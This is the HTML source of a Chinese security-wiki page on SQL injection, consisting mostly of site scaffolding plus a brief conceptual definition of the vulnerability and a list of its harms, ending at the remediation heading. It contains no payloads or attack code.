<!DOCTYPE html>
<html lang="zh-CN">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="generator" content="VuePress 2.0.0-beta.61">
    <script>
      (function() {
        const userMode = localStorage.getItem('vuepress-reco-color-scheme') || 'auto';
        const systemDarkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;

        if (userMode === 'dark' || (userMode === 'auto' && systemDarkMode)) {
          document.documentElement.classList.toggle('dark', true);
        }
      })();
    </script>
    <link rel="icon" href="/icons/logo.ico"><title>SQL 注入漏洞 | 枫-WIKI</title><meta name="description" content="">
    <link rel="modulepreload" href="/assets/app-5881e473.js"><link rel="modulepreload" href="/assets/framework-cfcd8ab0.js"><link rel="modulepreload" href="/assets/SQLI.html-a8634634.js"><link rel="modulepreload" href="/assets/SQLI.html-d55958ed.js"><link rel="prefetch" href="/assets/index.html-ef2f4f01.js" as="script"><link rel="prefetch" href="/assets/index.html-c463faa5.js" as="script"><link rel="prefetch" href="/assets/index.html-673c0f5b.js" as="script"><link rel="prefetch" href="/assets/MsSQL.html-70ce526c.js" as="script"><link rel="prefetch" href="/assets/MySQL.html-9df6de7b.js" as="script"><link rel="prefetch" href="/assets/index.html-b53238f0.js" as="script"><link rel="prefetch" href="/assets/Redis.html-0420ce1f.js" as="script"><link rel="prefetch" href="/assets/equalProtectionEvaluation.html-48c44fc4.js" as="script"><link rel="prefetch" href="/assets/index.html-9b201728.js" as="script"><link rel="prefetch" href="/assets/riskAssessment.html-eb01a245.js" as="script"><link rel="prefetch" href="/assets/SDLC.html-ed71076d.js" as="script"><link rel="prefetch" href="/assets/informationGathering.html-9b3b5c82.js" as="script"><link rel="prefetch" href="/assets/index.html-1dbc2faf.js" as="script"><link rel="prefetch" href="/assets/socialEngineering.html-b50f74a3.js" as="script"><link rel="prefetch" href="/assets/index.html-5ac98907.js" as="script"><link rel="prefetch" href="/assets/index.html-3d35371d.js" as="script"><link rel="prefetch" href="/assets/environmentConstruction.html-1f666e2d.js" as="script"><link rel="prefetch" href="/assets/grammaticalBasic.html-d80f1e19.js" as="script"><link rel="prefetch" href="/assets/containerTechnology.html-321cdd0b.js" as="script"><link rel="prefetch" href="/assets/microServices.html-ddb5efa0.js" as="script"><link rel="prefetch" href="/assets/environmentConstruction.html-cedc583a.js" as="script"><link rel="prefetch" href="/assets/grammaticalBasic.html-e6c1efa5.js" as="script"><link rel="prefetch" href="/assets/bruteForce.html-0a4d618f.js" as="script"><link rel="prefetch" href="/assets/CSRF.html-f134eb62.js" as="script"><link rel="prefetch" href="/assets/deserialize.html-9a6e99e8.js" as="script"><link rel="prefetch" href="/assets/LFR.html-9e83368c.js" as="script"><link rel="prefetch" href="/assets/LFU.html-04fb2ab2.js" as="script"><link rel="prefetch" href="/assets/logicalVulnerability.html-4ff3872d.js" as="script"><link rel="prefetch" href="/assets/RCE.html-d14f874c.js" as="script"><link rel="prefetch" href="/assets/XSS.html-18fe7621.js" as="script"><link rel="prefetch" href="/assets/XXE.html-bc1a1cdc.js" as="script"><link rel="prefetch" href="/assets/404.html-f9875e7b.js" as="script"><link rel="prefetch" href="/assets/index.html-8b2e66d1.js" as="script"><link rel="prefetch" href="/assets/index.html-b365af6f.js" as="script"><link rel="prefetch" href="/assets/index.html-f6d9119a.js" as="script"><link rel="prefetch" href="/assets/MsSQL.html-2a55540b.js" as="script"><link rel="prefetch" href="/assets/MySQL.html-b69e4451.js" as="script"><link rel="prefetch" href="/assets/index.html-7650cdc9.js" as="script"><link rel="prefetch" href="/assets/Redis.html-121b475f.js" as="script"><link rel="prefetch" href="/assets/equalProtectionEvaluation.html-059abcda.js" as="script"><link rel="prefetch" href="/assets/index.html-c793a4ba.js" as="script"><link rel="prefetch" href="/assets/riskAssessment.html-4689c4d1.js" as="script"><link rel="prefetch" href="/assets/SDLC.html-2554cefe.js" as="script"><link rel="prefetch" href="/assets/informationGathering.html-9b74a720.js" as="script"><link rel="prefetch" href="/assets/index.html-a668a623.js" as="script"><link rel="prefetch" href="/assets/socialEngineering.html-dc891ae6.js" as="script"><link rel="prefetch" href="/assets/index.html-50961eef.js" as="script"><link rel="prefetch" href="/assets/index.html-fe206177.js" as="script"><link rel="prefetch" href="/assets/environmentConstruction.html-70f776b7.js" as="script"><link rel="prefetch" href="/assets/grammaticalBasic.html-ee3d8bde.js" as="script"><link rel="prefetch" href="/assets/containerTechnology.html-41c837af.js" as="script"><link rel="prefetch" href="/assets/microServices.html-4af09f15.js" as="script"><link rel="prefetch" href="/assets/environmentConstruction.html-079c0597.js" as="script"><link rel="prefetch" href="/assets/grammaticalBasic.html-e58f0f43.js" as="script"><link rel="prefetch" href="/assets/bruteForce.html-61ad44bd.js" as="script"><link rel="prefetch" href="/assets/CSRF.html-e26f265a.js" as="script"><link rel="prefetch" href="/assets/deserialize.html-4f03440a.js" as="script"><link rel="prefetch" href="/assets/LFR.html-5e8c3544.js" as="script"><link rel="prefetch" href="/assets/LFU.html-d62f2287.js" as="script"><link rel="prefetch" href="/assets/logicalVulnerability.html-09aab4af.js" as="script"><link rel="prefetch" href="/assets/RCE.html-d839f9c9.js" as="script"><link rel="prefetch" href="/assets/XSS.html-fe9e3ca4.js" as="script"><link rel="prefetch" href="/assets/XXE.html-2efcbabb.js" as="script"><link rel="prefetch" href="/assets/404.html-e8c0dabf.js" as="script"><link rel="prefetch" href="/assets/reco-valine-a0c1af1f.js" as="script">
    <link rel="preload" href="/assets/style-f46010f0.css" as="style"><link rel="stylesheet" href="/assets/style-f46010f0.css">
  </head>
  <body>
    <div id="app"><!--[--><div class="theme-container"><!----><div class="common-wrapper show-series show-catalog"><div><header class="navbar-container"><!--[--><div class="site-brand nav-item"><img class="logo" src="/icons/logo.png" alt="枫-WIKI"><a href="/" class="site-name can-hide">枫-WIKI</a></div><div class="nav-item navbar-links-wrapper" style=""><div><form class="search-box" role="search"><input type="search" autocomplete="off" spellcheck="false" value><!----></form></div><nav class="navbar-links"><!--[--><div class="navbar-links__item"><a href="/docs/WebSecurity/" class="link router-link-active" aria-label="WEB安全"><!--[--><!--]--><span class="xicon-container left"><!--[--><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 32 32" class="xicon-icon" style="width:18px;height:18px;font-size:18px;color:inherit;"><path d="M26 2h4v4h-4z" fill="currentColor"></path><path d="M26 8h4v4h-4z" fill="currentColor"></path><path d="M20 2h4v4h-4z" fill="currentColor"></path><path d="M20 8h4v4h-4z" fill="currentColor"></path><path d="M28 16v6H4V6h12V4H4a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h8v4H8v2h16v-2h-4v-4h8a2 2 0 0 0 2-2v-6zM18 28h-4v-4h4z" fill="currentColor"></path></svg><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->WEB安全<!--]--></span></span><!--[--><!--]--></a></div><div class="navbar-links__item"><a href="/docs/InformationSecurity/" class="link" aria-label="信息安全"><!--[--><!--]--><span class="xicon-container left"><!--[--><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 32 32" class="xicon-icon" style="width:18px;height:18px;font-size:18px;color:inherit;"><path d="M28 6v20H4V6h24m0-2H4a2 2 0 0 0-2 2v20a2 2 0 0 0 2 2h24a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z" fill="currentColor"></path><path d="M6 10h7v2H6z" fill="currentColor"></path><path d="M6 14h4v2H6z" fill="currentColor"></path><path d="M23 18h-6a3 3 0 0 0-3 3v2h2v-2a1 1 0 0 1 1-1h6a1 1 0 0 1 1 1v2h2v-2a3 3 0 0 0-3-3z" fill="currentColor"></path><path d="M20 17a4 4 0 1 0-4-4a4 4 0 0 0 4 4zm0-6a2 2 0 1 1-2 2a2 2 0 0 1 2-2z" fill="currentColor"></path></svg><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->信息安全<!--]--></span></span><!--[--><!--]--></a></div><div class="navbar-links__item"><a href="/docs/OperationalSecurity/" class="link" aria-label="运营安全"><!--[--><!--]--><span class="xicon-container left"><!--[--><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 32 32" class="xicon-icon" style="width:18px;height:18px;font-size:18px;color:inherit;"><path d="M16 2a8 8 0 1 0 8 8a8.01 8.01 0 0 0-8-8zm5.91 7h-2.438a15.246 15.246 0 0 0-.791-4.36A6.009 6.009 0 0 1 21.91 9zm-5.888 6.999h-.008c-.38-.12-1.309-1.821-1.479-4.999h2.93c-.17 3.176-1.094 4.877-1.443 4.999zM14.535 9c.17-3.176 1.094-4.877 1.443-4.999h.008c.38.12 1.309 1.821 1.479 4.999zM13.32 4.64A15.246 15.246 0 0 0 12.528 9H10.09a6.009 6.009 0 0 1 3.23-4.36zM10.09 11h2.437a15.246 15.246 0 0 0 .792 4.36A6.009 6.009 0 0 1 10.09 11zm8.59 4.36a15.246 15.246 0 0 0 .792-4.36h2.438a6.009 6.009 0 0 1-3.23 4.36z" fill="currentColor"></path><path d="M28 30H4a2.002 2.002 0 0 1-2-2v-6a2.002 2.002 0 0 1 2-2h24a2.002 2.002 0 0 1 2 2v6a2.002 2.002 0 0 1-2 2zM4 22v6h24v-6z" fill="currentColor"></path><circle cx="7" cy="25" r="1" fill="currentColor"></circle></svg><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->运营安全<!--]--></span></span><!--[--><!--]--></a></div><div class="navbar-links__item"><a href="/docs/DatabasesSecurity/" class="link" aria-label="数据库安全"><!--[--><!--]--><span class="xicon-container left"><!--[--><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 32 32" class="xicon-icon" style="width:18px;height:18px;font-size:18px;color:inherit;"><path d="M24 3H8a2 2 0 0 0-2 2v22a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V5a2 2 0 0 0-2-2zm0 2v6H8V5zM8 19v-6h16v6zm0 8v-6h16v6z" fill="currentColor"></path><circle cx="11" cy="8" r="1" fill="currentColor"></circle><circle cx="11" cy="16" r="1" fill="currentColor"></circle><circle cx="11" cy="24" r="1" fill="currentColor"></circle></svg><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->数据库安全<!--]--></span></span><!--[--><!--]--></a></div><div class="navbar-links__item"><a href="/docs/CloudNativeSecurity/" class="link" aria-label="云原生安全"><!--[--><!--]--><span class="xicon-container left"><!--[--><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 32 32" class="xicon-icon" style="width:18px;height:18px;font-size:18px;color:inherit;"><path d="M22.5 13c-4.7 0-8.5 3.8-8.5 8.5s3.8 8.5 8.5 8.5s8.5-3.8 8.5-8.5s-3.8-8.5-8.5-8.5zm6.5 8h-3c0-2-.3-4-.9-5.5c2.1 1 3.7 3 3.9 5.5zm-6.5 7c-.4-.2-1.3-1.8-1.5-5h2.9c-.2 3.2-1 4.8-1.4 5zM21 21c.1-3.8 1.1-5.8 1.4-6c.4.2 1.4 2.2 1.5 6H21zm-1.1-5.5c-.6 1.5-.8 3.5-.9 5.5h-3c.2-2.5 1.8-4.5 3.9-5.5zM16.2 23H19c.1 1.6.4 3.2.9 4.5c-1.8-.8-3.2-2.5-3.7-4.5zm8.9 4.5c.5-1.3.8-2.8.9-4.5h2.9c-.6 2-2 3.7-3.8 4.5z" fill="currentColor"></path><path d="M25.8 10c-.9-4.6-5-8-9.8-8c-4.8 0-8.9 3.4-9.8 8.1c-3.5.7-6.2 3.7-6.2 7.4C0 21.6 3.4 25 7.5 25H11v-2H7.5c-3 0-5.5-2.5-5.5-5.5c0-2.9 2.2-5.3 5.1-5.5H8v-.9c.5-4 3.9-7.1 8-7.1c3.7 0 6.8 2.6 7.7 6h2.1z" fill="currentColor"></path></svg><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->云原生安全<!--]--></span></span><!--[--><!--]--></a></div><div class="navbar-links__item"><a href="/docs/ProgrammingLearning/" class="link" aria-label="编程学习"><!--[--><!--]--><span class="xicon-container left"><!--[--><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 32 32" class="xicon-icon" style="width:18px;height:18px;font-size:18px;color:inherit;"><path d="M31 16l-7 7l-1.41-1.41L28.17 16l-5.58-5.59L24 9l7 7z" fill="currentColor"></path><path d="M1 16l7-7l1.41 1.41L3.83 16l5.58 5.59L8 23l-7-7z" fill="currentColor"></path><path d="M12.419 25.484L17.639 6l1.932.518L14.35 26z" fill="currentColor"></path></svg><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->编程学习<!--]--></span></span><!--[--><!--]--></a></div><!--]--></nav><span class="xicon-container btn-toggle-dark-mode btn--dark-mode"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 32 32" style="width:20px;height:20px;font-size:20px;color:inherit;"><path d="M15 2h2v3h-2z" fill="currentColor"></path><path d="M27 15h3v2h-3z" fill="currentColor"></path><path d="M15 27h2v3h-2z" fill="currentColor"></path><path d="M2 15h3v2H2z" fill="currentColor"></path><path d="M5.45 6.884l1.414-1.415l2.121 2.122l-1.414 1.414z" fill="currentColor"></path><path d="M23 7.58l2.121-2.12l1.414 1.414l-2.121 2.121z" fill="currentColor"></path><path d="M23.002 24.416l1.415-1.414l2.12 2.122l-1.413 1.414z" fill="currentColor"></path><path d="M5.47 25.13L7.59 23L9 24.42l-2.12 2.12l-1.41-1.41z" fill="currentColor"></path><path d="M16 8a8 8 0 1 0 8 8a8 8 0 0 0-8-8zm0 14a6 6 0 0 1 0-12z" fill="currentColor"></path></svg></span><span class="xicon-container btn-toggle-menus"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 32 32" style="width:20px;height:20px;font-size:20px;color:inherit;"><circle cx="16" cy="8" r="2" fill="currentColor"></circle><circle cx="16" cy="16" r="2" fill="currentColor"></circle><circle cx="16" cy="24" r="2" fill="currentColor"></circle></svg></span></div><!--]--></header><div class="mobile-menus-container"><nav class="navbar-links mobile"><!--[--><div class="navbar-links__item"><a href="/docs/WebSecurity/" class="link router-link-active" aria-label="WEB安全"><!--[--><!--]--><span class="xicon-container left"><!--[--><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 32 32" class="xicon-icon" style="width:18px;height:18px;font-size:18px;color:inherit;"><path d="M26 2h4v4h-4z" fill="currentColor"></path><path d="M26 8h4v4h-4z" fill="currentColor"></path><path d="M20 2h4v4h-4z" fill="currentColor"></path><path d="M20 8h4v4h-4z" fill="currentColor"></path><path d="M28 16v6H4V6h12V4H4a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h8v4H8v2h16v-2h-4v-4h8a2 2 0 0 0 2-2v-6zM18 28h-4v-4h4z" fill="currentColor"></path></svg><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->WEB安全<!--]--></span></span><!--[--><!--]--></a></div><div class="navbar-links__item"><a href="/docs/InformationSecurity/" class="link" aria-label="信息安全"><!--[--><!--]--><span class="xicon-container left"><!--[--><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 32 32" class="xicon-icon" style="width:18px;height:18px;font-size:18px;color:inherit;"><path d="M28 6v20H4V6h24m0-2H4a2 2 0 0 0-2 2v20a2 2 0 0 0 2 2h24a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z" fill="currentColor"></path><path d="M6 10h7v2H6z" fill="currentColor"></path><path d="M6 14h4v2H6z" fill="currentColor"></path><path d="M23 18h-6a3 3 0 0 0-3 3v2h2v-2a1 1 0 0 1 1-1h6a1 1 0 0 1 1 1v2h2v-2a3 3 0 0 0-3-3z" fill="currentColor"></path><path d="M20 17a4 4 0 1 0-4-4a4 4 0 0 0 4 4zm0-6a2 2 0 1 1-2 2a2 2 0 0 1 2-2z" fill="currentColor"></path></svg><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->信息安全<!--]--></span></span><!--[--><!--]--></a></div><div class="navbar-links__item"><a href="/docs/OperationalSecurity/" class="link" aria-label="运营安全"><!--[--><!--]--><span class="xicon-container left"><!--[--><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 32 32" class="xicon-icon" style="width:18px;height:18px;font-size:18px;color:inherit;"><path d="M16 2a8 8 0 1 0 8 8a8.01 8.01 0 0 0-8-8zm5.91 7h-2.438a15.246 15.246 0 0 0-.791-4.36A6.009 6.009 0 0 1 21.91 9zm-5.888 6.999h-.008c-.38-.12-1.309-1.821-1.479-4.999h2.93c-.17 3.176-1.094 4.877-1.443 4.999zM14.535 9c.17-3.176 1.094-4.877 1.443-4.999h.008c.38.12 1.309 1.821 1.479 4.999zM13.32 4.64A15.246 15.246 0 0 0 12.528 9H10.09a6.009 6.009 0 0 1 3.23-4.36zM10.09 11h2.437a15.246 15.246 0 0 0 .792 4.36A6.009 6.009 0 0 1 10.09 11zm8.59 4.36a15.246 15.246 0 0 0 .792-4.36h2.438a6.009 6.009 0 0 1-3.23 4.36z" fill="currentColor"></path><path d="M28 30H4a2.002 2.002 0 0 1-2-2v-6a2.002 2.002 0 0 1 2-2h24a2.002 2.002 0 0 1 2 2v6a2.002 2.002 0 0 1-2 2zM4 22v6h24v-6z" fill="currentColor"></path><circle cx="7" cy="25" r="1" fill="currentColor"></circle></svg><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->运营安全<!--]--></span></span><!--[--><!--]--></a></div><div class="navbar-links__item"><a href="/docs/DatabasesSecurity/" class="link" aria-label="数据库安全"><!--[--><!--]--><span class="xicon-container left"><!--[--><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 32 32" class="xicon-icon" style="width:18px;height:18px;font-size:18px;color:inherit;"><path d="M24 3H8a2 2 0 0 0-2 2v22a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V5a2 2 0 0 0-2-2zm0 2v6H8V5zM8 19v-6h16v6zm0 8v-6h16v6z" fill="currentColor"></path><circle cx="11" cy="8" r="1" fill="currentColor"></circle><circle cx="11" cy="16" r="1" fill="currentColor"></circle><circle cx="11" cy="24" r="1" fill="currentColor"></circle></svg><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->数据库安全<!--]--></span></span><!--[--><!--]--></a></div><div class="navbar-links__item"><a href="/docs/CloudNativeSecurity/" class="link" aria-label="云原生安全"><!--[--><!--]--><span class="xicon-container left"><!--[--><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 32 32" class="xicon-icon" style="width:18px;height:18px;font-size:18px;color:inherit;"><path d="M22.5 13c-4.7 0-8.5 3.8-8.5 8.5s3.8 8.5 8.5 8.5s8.5-3.8 8.5-8.5s-3.8-8.5-8.5-8.5zm6.5 8h-3c0-2-.3-4-.9-5.5c2.1 1 3.7 3 3.9 5.5zm-6.5 7c-.4-.2-1.3-1.8-1.5-5h2.9c-.2 3.2-1 4.8-1.4 5zM21 21c.1-3.8 1.1-5.8 1.4-6c.4.2 1.4 2.2 1.5 6H21zm-1.1-5.5c-.6 1.5-.8 3.5-.9 5.5h-3c.2-2.5 1.8-4.5 3.9-5.5zM16.2 23H19c.1 1.6.4 3.2.9 4.5c-1.8-.8-3.2-2.5-3.7-4.5zm8.9 4.5c.5-1.3.8-2.8.9-4.5h2.9c-.6 2-2 3.7-3.8 4.5z" fill="currentColor"></path><path d="M25.8 10c-.9-4.6-5-8-9.8-8c-4.8 0-8.9 3.4-9.8 8.1c-3.5.7-6.2 3.7-6.2 7.4C0 21.6 3.4 25 7.5 25H11v-2H7.5c-3 0-5.5-2.5-5.5-5.5c0-2.9 2.2-5.3 5.1-5.5H8v-.9c.5-4 3.9-7.1 8-7.1c3.7 0 6.8 2.6 7.7 6h2.1z" fill="currentColor"></path></svg><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->云原生安全<!--]--></span></span><!--[--><!--]--></a></div><div class="navbar-links__item"><a href="/docs/ProgrammingLearning/" class="link" aria-label="编程学习"><!--[--><!--]--><span class="xicon-container left"><!--[--><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 32 32" class="xicon-icon" style="width:18px;height:18px;font-size:18px;color:inherit;"><path d="M31 16l-7 7l-1.41-1.41L28.17 16l-5.58-5.59L24 9l7 7z" fill="currentColor"></path><path d="M1 16l7-7l1.41 1.41L3.83 16l5.58 5.59L8 23l-7-7z" fill="currentColor"></path><path d="M12.419 25.484L17.639 6l1.932.518L14.35 26z" fill="currentColor"></path></svg><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->编程学习<!--]--></span></span><!--[--><!--]--></a></div><!--]--></nav><div class="appearance"><span>Appearance</span><span class="xicon-container btn-toggle-dark-mode"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 32 32" style="width:20px;height:20px;font-size:20px;color:inherit;"><path d="M15 2h2v3h-2z" fill="currentColor"></path><path d="M27 15h3v2h-3z" fill="currentColor"></path><path d="M15 27h2v3h-2z" fill="currentColor"></path><path d="M2 15h3v2H2z" fill="currentColor"></path><path d="M5.45 6.884l1.414-1.415l2.121 2.122l-1.414 1.414z" fill="currentColor"></path><path d="M23 7.58l2.121-2.12l1.414 1.414l-2.121 2.121z" fill="currentColor"></path><path d="M23.002 24.416l1.415-1.414l2.12 2.122l-1.413 1.414z" fill="currentColor"></path><path d="M5.47 25.13L7.59 23L9 24.42l-2.12 2.12l-1.41-1.41z" fill="currentColor"></path><path d="M16 8a8 8 0 1 0 8 8a8 8 0 0 0-8-8zm0 14a6 6 0 0 1 0-12z" fill="currentColor"></path></svg></span></div></div><div class="series-mask"></div><aside class="series-container"><div class="site-brand"><img class="logo" src="/icons/logo.png" alt="枫-WIKI"><a href="/" class="site-name can-hide">枫-WIKI</a></div><!--[--><!--[--><section class="series-group series-item"><h5 class="series-heading active">常见漏洞</h5><ul><li><!--[--><a href="/docs/WebSecurity/CommonVulnerabilities/logicalVulnerability.html" class="link series-item" aria-label="逻辑越权漏洞"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->逻辑越权漏洞<!--]--></span></span><!--[--><!--]--></a><!--]--></li><li><!--[--><a href="/docs/WebSecurity/CommonVulnerabilities/bruteForce.html" class="link series-item" aria-label="暴力破解攻击"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->暴力破解攻击<!--]--></span></span><!--[--><!--]--></a><!--]--></li><li><!--[--><a href="/docs/WebSecurity/CommonVulnerabilities/XSS.html" class="link series-item" aria-label="跨站脚本攻击"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->跨站脚本攻击<!--]--></span></span><!--[--><!--]--></a><!--]--></li><li><!--[--><a href="/docs/WebSecurity/CommonVulnerabilities/CSRF.html" class="link series-item" aria-label="跨站请求伪造"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->跨站请求伪造<!--]--></span></span><!--[--><!--]--></a><!--]--></li><li><!--[--><a href="/docs/WebSecurity/CommonVulnerabilities/RCE.html" class="link series-item" aria-label="命令执行漏洞"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->命令执行漏洞<!--]--></span></span><!--[--><!--]--></a><!--]--></li><li><!--[--><a href="/docs/WebSecurity/CommonVulnerabilities/deserialize.html" class="link series-item" aria-label="反序列化漏洞"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->反序列化漏洞<!--]--></span></span><!--[--><!--]--></a><!--]--></li><li><!--[--><a href="/docs/WebSecurity/CommonVulnerabilities/LFR.html" class="link series-item" aria-label="任意文件读取"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->任意文件读取<!--]--></span></span><!--[--><!--]--></a><!--]--></li><li><!--[--><a href="/docs/WebSecurity/CommonVulnerabilities/LFU.html" class="link series-item" aria-label="任意文件上传"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->任意文件上传<!--]--></span></span><!--[--><!--]--></a><!--]--></li><li><!--[--><a aria-current="page" href="/docs/WebSecurity/CommonVulnerabilities/SQLI.html" class="router-link-active router-link-exact-active link router-link-active series-item active" aria-label="SQL 注入漏洞"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->SQL 注入漏洞<!--]--></span></span><!--[--><!--]--></a><!--]--></li><li><!--[--><a href="/docs/WebSecurity/CommonVulnerabilities/XXE.html" class="link series-item" aria-label="XML 实体注入"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->XML 实体注入<!--]--></span></span><!--[--><!--]--></a><!--]--></li></ul></section><!--]--><!--]--></aside><!--[--><main class="page-container"><h1 class="page-title">SQL 注入漏洞</h1><div class="page-info"><span class="xicon-container left"><!--[--><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 32 32" class="xicon-icon" style="width:18px;height:18px;font-size:18px;color:inherit;"><path d="M16 4a5 5 0 1 1-5 5a5 5 0 0 1 5-5m0-2a7 7 0 1 0 7 7a7 7 0 0 0-7-7z" fill="currentColor"></path><path d="M26 30h-2v-5a5 5 0 0 0-5-5h-6a5 5 0 0 0-5 5v5H6v-5a7 7 0 0 1 7-7h6a7 7 0 0 1 7 7z" fill="currentColor"></path></svg><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->YOUZAI<!--]--></span></span><span class="xicon-container left"><!--[--><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 32 32" class="xicon-icon" style="width:18px;height:18px;font-size:18px;color:inherit;"><path d="M26 4h-4V2h-2v2h-8V2h-2v2H6c-1.1 0-2 .9-2 2v20c0 1.1.9 2 2 2h20c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 22H6V12h20v14zm0-16H6V6h4v2h2V6h8v2h2V6h4v4z" fill="currentColor"></path></svg><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->2023/04/25<!--]--></span></span><span class="xicon-container left"><!--[--><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 32 32" class="xicon-icon" style="width:18px;height:18px;font-size:18px;color:inherit;"><path d="M11.17 6l3.42 3.41l.58.59H28v16H4V6h7.17m0-2H4a2 2 0 0 0-2 2v20a2 2 0 0 0 2 2h24a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2H16l-3.41-3.41A2 2 0 0 0 11.17 4z" fill="currentColor"></path></svg><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->常见漏洞<!--]--></span></span><span class="xicon-container left"><!--[--><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 32 32" class="xicon-icon" style="width:18px;height:18px;font-size:18px;color:inherit;"><path d="M10 14a4 4 0 1 1 4-4a4.005 4.005 0 0 1-4 4zm0-6a2 2 0 1 0 1.998 2.004A2.002 2.002 0 0 0 10 8z" fill="currentColor"></path><path d="M16.644 29.415L2.586 15.354A2 2 0 0 1 2 13.941V4a2 2 0 0 1 2-2h9.941a2 2 0 0 1 1.414.586l14.06 14.058a2 2 0 0 1 0 2.828l-9.943 9.943a2 2 0 0 1-2.829 0zM4 4v9.942L18.058 28L28 18.058L13.942 4z" fill="currentColor"></path></svg><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->WEB安全<!--]--></span></span><!----></div><div class="theme-reco-default-content"><div><h2 id="漏洞原理" tabindex="-1"><a class="header-anchor" href="#漏洞原理" aria-hidden="true">#</a> 漏洞原理</h2><blockquote><p>SQL 注入就是指 web 应用程序对用户输入的数据合法性没有过滤或者是判断，前端传入的参数是攻击者可以控制，并且参数带入数据库的查询，攻击者可以通过构造恶意的 SQL 语句来实现对数据库的任意操作。</p></blockquote><h2 id="漏洞危害" tabindex="-1"><a class="header-anchor" href="#漏洞危害" aria-hidden="true">#</a> 漏洞危害</h2><ul><li>数据库信息泄露：数据库中存放的用户隐私信息的泄露。</li><li>网页篡改：通过操作数据库对特定网页进行篡。</li><li>网页被挂马，传播恶意软件：修改数据库一些字段的值，嵌入网马链接，进行挂马攻击。</li><li>数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员账户被篡改。</li><li>服务器被远程控制，被安装后门：经由数据库服务器提供的操作系统支持让黑客得以修改或控制操作系统。</li><li>破坏硬盘数据，瘫痪全系统。</li></ul><h2 id="修复建议" tabindex="-1"><a class="header-anchor" href="#修复建议" aria-hidden="true">#</a> 